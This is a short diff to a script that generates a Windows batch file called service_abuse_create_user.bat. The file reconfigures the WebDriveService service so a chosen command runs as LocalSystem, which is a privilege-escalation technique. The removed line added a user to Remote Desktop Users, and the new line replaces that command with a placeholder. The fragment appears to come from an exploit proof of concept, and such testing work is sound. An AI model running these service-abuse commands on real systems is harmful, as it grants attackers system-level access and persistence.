@@ -199,7 +199,7 @@ cat <<\EOT >service_abuse_create_user.bat
     net start WebDriveService
     net start WebDriveService
 
-    sc config WebDriveService binpath= "net localgroup \"Remote Desktop Users\" amxuser1 /add"
+    sc config WebDriveService binpath= "type "
     sc config WebDriveService obj= ".\LocalSystem" password= ""
     sc qc WebDriveService
     net stop WebDriveService
